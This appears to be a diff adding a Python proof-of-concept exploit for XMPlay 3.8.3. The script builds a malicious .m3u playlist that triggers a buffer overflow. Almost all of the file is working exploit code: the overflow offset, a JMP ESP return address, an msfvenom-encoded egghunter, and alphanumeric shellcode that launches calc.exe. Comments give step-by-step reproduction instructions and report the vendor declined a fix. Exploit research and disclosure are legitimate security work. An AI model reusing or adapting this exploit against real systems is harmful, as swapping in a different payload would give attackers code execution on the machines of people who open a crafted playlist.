@@ -1,0 +1,82 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title: XMPlay 3.8.3 - '.m3u' Code Execution (PoC)
+# Date: 2018-12-19
+# Exploit Author: s7acktrac3
+# Vendor Homepage: https://www.xmplay.com/
+# Software Link: https://support.xmplay.com/files_view.php?file_id=676
+# Version: 3.8.3 (latest)
+# Tested on: Windows XP SP3
+# CVE : Reserved
+#
+# Developer notified & delivered PoC but not interested in fixing :P 
+#
+# Reproduction Steps:
+# Lauch XMPlay & run this PoC script - it will create a file in the same directory named xmplay.m3u
+# Either drag xmplay.m3u into the XMPlay window or File Menu-> select winamp.m3u. Application will "load"
+# for a minute (exploit searching through memory for payload) and eventually launch calc.exe 
+#
+# Major Shouts @Gokhan @foolsofsecurity for helping turn the DoS into Code execution & me into more of a 
+# beast!
+ 
+from struct import pack
+
+max_size = 728 
+# C:\Documents and Settings\Administrator\Desktop\Exploit Dev\xmplay_383-poc.py
+eip_offset = 500
+
+file_header  = "#EXTM3U\n\r" 
+file_header += "#EXTINF:200,Sleep Away\n\r"
+file_header += "http://test." 
+
+# cat egghunter.txt | tr -d '"' | tr -d '\n' | tr -d '\\x' | xxd -r -p > egghunter.bin
+#  msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EDX -a x86 --platform Windows
+encoded_egg_hunter =  (""
+"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a" 
+"\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
+"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
+"\x38\x41\x42\x75\x4a\x49\x62\x46\x6f\x71\x4b\x7a\x49\x6f\x44"
+"\x4f\x53\x72\x36\x32\x61\x7a\x46\x62\x66\x38\x78\x4d\x64\x6e"
+"\x75\x6c\x75\x55\x63\x6a\x54\x34\x68\x6f\x6d\x68\x63\x47\x34"
+"\x70\x54\x70\x72\x54\x4e\x6b\x58\x7a\x4e\x4f\x42\x55\x6b\x5a"
+"\x4c\x6f\x31\x65\x78\x67\x59\x6f\x39\x77\x41\x41")
+
+encoded_calc =  "w00tw00t" + "\x57\x58\x04\x06\x50\x5E" # PUSH EDI, POP EAX, ADD AL,6, PUSH EAX, POP ESI
+encoded_calc += "\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49"
+encoded_calc += "\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51"
+encoded_calc += "\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
+encoded_calc += "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
+encoded_calc += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75"
+encoded_calc += "\x4a\x49\x36\x51\x49\x59\x52\x71\x61\x78"
+encoded_calc += "\x75\x33\x50\x61\x72\x4c\x31\x73\x73\x64"
+encoded_calc += "\x6e\x58\x49\x57\x6a\x33\x39\x52\x64\x37"
+encoded_calc += "\x6b\x4f\x38\x50\x41\x41"
+
+egg_addr_to_edx  = ""
+egg_addr_to_edx += "\x54" 				    #    PUSH ESP
+egg_addr_to_edx += "\x58" 				    #    POP EAX
+egg_addr_to_edx += "\x2D\x3C\x55\x55\x55"   #    SUB EAX,5555553C
+egg_addr_to_edx += "\x2D\x3C\x55\x55\x55"   #    SUB EAX,5555553C
+egg_addr_to_edx += "\x2D\x3C\x55\x55\x55"   #    SUB EAX,5555553C
+egg_addr_to_edx += "\x50" 				    #    PUSH eax
+egg_addr_to_edx += "\x5A"   			    #    POP EDX
+
+
+payload  = "A" * 12
+payload += encoded_calc
+payload += "A" * (eip_offset - len(payload))
+print "Length of payload " + str(len(payload)) 
+payload += pack("<L", 0x78196d4d) 			# Jmp esp OS DLL
+payload += "BBBB"
+payload += egg_addr_to_edx
+payload += "C" * (76  - len(egg_addr_to_edx) )
+payload += encoded_egg_hunter
+payload += "C" * (max_size - len(payload)) 
+stupid_char = "|"
+
+print "[+] Creating .m3u file with payload size: "+ str(len(payload)) 
+exploit = file_header + payload + stupid_char
+file = open('xmplay.m3u','w')
+file.write(exploit)
+file.close(); 
+print "[+] Done creating the file"
